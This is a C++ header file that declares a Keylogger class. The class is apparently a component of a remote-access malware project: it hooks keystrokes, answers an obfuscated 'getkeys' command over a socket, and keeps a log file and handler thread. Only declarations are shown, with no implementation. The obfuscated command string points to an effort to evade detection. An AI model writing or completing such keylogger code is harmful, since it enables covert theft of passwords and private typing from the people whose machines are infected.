#pragma once
#include "common.h"
#include "Hook.h"

#define CMD_GET_KEYS std::string{ AY_OBFUSCATE("getkeys") }

class Keylogger : public Hook
{
	public:
		Keylogger(char* exe);
		~Keylogger();

		void HandleHook(SOCKET s, const std::string &hook);

		static DWORD WINAPI Handle(LPVOID lpParameter);

		static HANDLE logs;

	private:
		HANDLE _thread_h;
		std::string _filename;
};

